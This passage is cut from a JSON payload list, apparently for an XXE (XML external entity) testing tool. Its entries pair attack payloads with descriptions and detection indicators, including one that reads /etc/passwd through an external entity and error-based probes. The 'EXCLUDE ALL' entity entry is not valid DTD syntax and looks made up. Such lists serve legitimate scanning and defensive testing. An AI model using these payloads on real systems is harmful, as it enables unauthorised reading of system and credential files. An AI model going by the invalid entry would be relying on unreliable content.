      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;\n</foo>",
        "description": "Newline after entity reference",
        "context": "XML Bypass",
        "indicator": "Whitespace tolerance"
      }
    ],
    "error_based_xxe": [
      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///nonexistent\">%xxe;]><foo/>",
        "description": "Error-based via nonexistent file",
        "context": "Error-based",
        "indicator": "No such file or directory"
      },
      {
        "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///\" EXCLUDE ALL>]><foo/>",
        "description": "EXCLUDE directive attack",
        "context": "Error-based",
        "indicator": "XML parsing error"
